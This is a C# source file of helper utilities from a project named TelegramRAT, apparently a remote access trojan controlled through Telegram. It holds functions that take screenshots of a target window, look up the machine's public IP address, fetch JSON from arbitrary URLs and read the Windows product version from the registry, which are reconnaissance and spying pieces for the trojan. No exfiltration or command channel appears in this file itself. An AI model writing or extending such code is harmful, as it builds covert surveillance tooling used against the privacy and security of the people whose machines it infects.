using Microsoft.Win32;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace TelegramRAT.Utilities;

static class Utils
{
    private static readonly object HttpClientLock = new();
    private static HttpClient _sharedHttpClient = CreateHttpClient();

    private static HttpClient SharedHttpClient => Volatile.Read(ref _sharedHttpClient);

    private static HttpClient CreateHttpClient()
    {
        var handler = new SocketsHttpHandler
        {
            AutomaticDecompression = DecompressionMethods.All,
            PooledConnectionLifetime = TimeSpan.FromMinutes(2)
        };

        return new HttpClient(handler, disposeHandler: true)
        {
            Timeout = TimeSpan.FromSeconds(10)
        };
    }

    internal static IDisposable OverrideHttpClient(HttpClient httpClient)
    {
        ArgumentNullException.ThrowIfNull(httpClient);

        HttpClient previous;
        lock (HttpClientLock)
        {
            previous = _sharedHttpClient;
            _sharedHttpClient = httpClient;
        }

        return new HttpClientOverride(previous);
    }

    private sealed class HttpClientOverride : IDisposable
    {
        private readonly HttpClient _previous;
        private bool _disposed;

        public HttpClientOverride(HttpClient previous)
        {
            _previous = previous;
        }

        public void Dispose()
        {
            if (_disposed)
            {
                return;
            }

            lock (HttpClientLock)
            {
                _sharedHttpClient.Dispose();
                _sharedHttpClient = _previous;
            }

            _disposed = true;
        }
    }

    public static void CaptureWindow(IntPtr hWnd, Stream buffer)
    {
        if (!WinAPI.GetClientRect(hWnd, out Rectangle windowbounds))
        {
            throw new Win32Exception(Marshal.GetLastWin32Error(), "Failed to retrieve window bounds.");
        }

        using var windowCap = new Bitmap(windowbounds.Width, windowbounds.Height);
        using var wndGraphics = Graphics.FromImage(windowCap);

        IntPtr graphicsDc = IntPtr.Zero;
        IntPtr windowDc = IntPtr.Zero;

        try
        {
            graphicsDc = wndGraphics.GetHdc();
            windowDc = WinAPI.GetDC(hWnd);

            if (windowDc == IntPtr.Zero)
            {
                throw new Win32Exception(Marshal.GetLastWin32Error(), "Failed to acquire window device context.");
            }

            WinAPI.BitBlt(graphicsDc, 0, 0, windowbounds.Width, windowbounds.Height, windowDc, 0, 0, 13369376);
        }
        finally
        {
            if (graphicsDc != IntPtr.Zero)
            {
                wndGraphics.ReleaseHdc();
            }

            if (windowDc != IntPtr.Zero)
            {
                WinAPI.ReleaseDC(hWnd, windowDc);
            }
        }

        windowCap.Save(buffer, System.Drawing.Imaging.ImageFormat.Png);
    }

    public static async Task<string> GetIpAddressAsync(CancellationToken cancellationToken = default)
    {
        using var response = await SharedHttpClient.GetAsync(
            "https://api.ipify.org/?format=json",
            HttpCompletionOption.ResponseHeadersRead,
            cancellationToken);

        response.EnsureSuccessStatusCode();

        await using var responseStream = await response.Content.ReadAsStreamAsync(cancellationToken);
        using var document = await JsonDocument.ParseAsync(responseStream, cancellationToken: cancellationToken);

        if (!document.RootElement.TryGetProperty("ip", out var ipProperty))
        {
            throw new InvalidOperationException("The response did not contain an IP address.");
        }

        var ip = ipProperty.GetString();
        if (string.IsNullOrWhiteSpace(ip))
        {
            throw new InvalidOperationException("The response contained an empty IP address.");
        }

        return ip;
    }

    public static async Task<T> GetFromJsonAsync<T>(string requestUri, CancellationToken cancellationToken = default)
    {
        using var response = await SharedHttpClient.GetAsync(
            requestUri,
            HttpCompletionOption.ResponseHeadersRead,
            cancellationToken);

        response.EnsureSuccessStatusCode();

        await using var responseStream = await response.Content.ReadAsStreamAsync(cancellationToken);
        var result = await JsonSerializer.DeserializeAsync<T>(responseStream, cancellationToken: cancellationToken);

        if (result is null)
        {
            throw new InvalidOperationException($"Failed to deserialize the response from '{requestUri}' to {typeof(T).Name}.");
        }

        return result;
    }

    public static string GetWindowsVersion()
    {
        try
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            if (key != null)
            {
                string prodName = key.GetValue("ProductName") as string;
                string csdVer = key.GetValue("CSDVersion") as string;
                return prodName + csdVer;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
        return string.Empty;
    }
}
